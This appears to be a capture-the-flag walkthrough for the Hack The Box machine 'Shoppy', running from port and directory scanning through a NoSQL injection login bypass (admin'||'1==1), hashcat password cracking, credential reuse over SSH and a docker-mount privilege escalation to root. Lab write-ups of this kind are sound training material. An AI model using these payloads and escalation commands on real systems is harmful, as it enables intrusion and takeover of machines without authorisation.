![Shoppy.PNG](/assets/Machines/Easy/Shoppy/shoppy.jpg)


1. Send an ICMP echo request to machine's IP address.
```bash
┌──(root㉿est)-[/home/kali]
└─| ping -c 2 10.10.11.180
```


2. Scan open ports with **nmap**.
```bash
┌──(root㉿kali)-[/home/kali]
└─| nmap -p- --open -vv -sS --min-rate 5000 -Pn -n 10.10.11.180
```

**Output**
```bash
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9093/tcp open  copycat
```

3. Host a machine in `/etc/hosts`
   
![Shoppy-hosts.PNG](/assets/Machines/Easy/Shoppy/shoppt-hosts.PNG)

4. Web Page
![Shopyy-web.PNG](/assets/Machines/Easy/Shoppy/shoppy-web.PNG)


5. Use **gobuster** to find directories
```bash
┌──(root㉿est)-[/home/kali/Desktop/Shoppy]
└─| gobuster dir -u http://shoppy.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

**Output**
```bash
/ADMIN                (Status: 302) [Size: 28] [--> /login]
/Admin                (Status: 302) [Size: 28] [--> /login]
/Login                (Status: 200) [Size: 1074]           
/admin                (Status: 302) [Size: 28] [--> /login]
/assets               (Status: 301) [Size: 179] [--> /assets/]
/css                  (Status: 301) [Size: 173] [--> /css/]   
/exports              (Status: 301) [Size: 181] [--> /exports/]
/favicon.ico          (Status: 200) [Size: 213054]             
/fonts                (Status: 301) [Size: 177] [--> /fonts/]  
/images               (Status: 301) [Size: 179] [--> /images/] 
/js                   (Status: 301) [Size: 171] [--> /js/]     
/login                (Status: 200) [Size: 1074]  
```

6. Do **No Sql Injection Attack** --- `admin'||'1==1`
7. In Search option write `admin` and `josh`
![Shoppy-admin.PNG](/assets/Machines/Easy/Shoppy/shoppy-admin.PNG)
![Shoppy-josh.PNG](/assets/Machines/Easy/Shoppy/shoppy-josh.PNG)

8. Crack with **Hashcat** Josh's password
```bash
┌──(root㉿est)-[/home/kali/Desktop/Shoppy]
└─| hashcat -m 0 jhon.txt ../rockyou.txt
```   
  
```bash        
┌──(root㉿est)-[/home/kali/Desktop/Shoppy]
└─# hashcat -m 0 jhon.txt --show        
6ebcea65320589ca4f2f1ce039975995:remembermethisway
```

9. Use **gobuster** again to search vhosts
```bash
┌──(root㉿est)-[/home/kali/Desktop/Shoppy]
└─| gobuster vhost -u http://shoppy.htb -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 50
```

**Output**
```bash
Found: mattermost.shoppy.htb (Status: 200) [Size: 3122]
```

10. Put vhost found in `/etc/hosts`
    
![Shoppy-vhost.PNG](/assets/Machines/Easy/Shoppy/shoppy-vhost.PNG)

11. Visit the vhost found and put credentials of **Josh**
12. Look on **Channel** > **Deploy Machine**

![Shoppy-mattermost.JPG](/assets/Machines/Easy/Shoppy/shoppy-mattermost.PNG)

13. Connect to ssh with user jaeger
```bash
┌──(root㉿est)-[/home/kali/Desktop/Shoppy]
└─| ssh jaeger@10.10.11.180
```

14. In current directory cat a **user flag**
```bash
jaeger@shoppy:~$ cat user.txt
8338caad7b4679f8c1d95b68f15aa6c5
```

15. Use sudo -l to find some important files or binaries to exploit
```bash
jaeger@shoppy:~/Desktop$ sudo -l
[sudo] password for jaeger: 
Matching Defaults entries for jaeger on shoppy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jaeger may run the following commands on shoppy:
    (deploy) /home/deploy/password-manager
```

16. cat `/home/deploy/password-manager` and find this lines
```bash
Welcome to Josh password manager!Please enter your master password: SampleAccess granted!
```

17. Run **password-manager** and put 'Sample'
```bash
jaeger@shoppy:/home/deploy$ sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password: Sample
Access granted! Here is creds !
Deploy Creds :
username: deploy
password: Deploying@pp!
```

18. Connect to ssh with new credentials
```bash
┌──(root㉿est)-[/home/kali/Desktop/Shoppy]
└─| ssh deploy@10.10.11.180
```

19. Spawn a `/bin/bash`
```bash
$ python3 -c "import pty; pty.spawn('/bin/bash')"
```

**Output**
```bash
deploy@shoppy:~$ 
```


20. If you look the message of **Josh** he tell let's use docker to deploy a machine
![Shoppy-message.PNG](/assets/Machines/Easy/Shoppy/shoppy-message.PNG)

21. To get access how root use **https://gtfobins.github.io/** and search **docker**
![Shoppy-gtfo.PNG](/assets/Machines/Easy/Shoppy/shoppy-gtfo.PNG)


22. Run the command
```bash
deploy@shoppy:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# whoami
root
```

23. Cat a **root flag**
```bash
# cd root
# cat root.txt
77845f37157645868120f6d66120bed6
```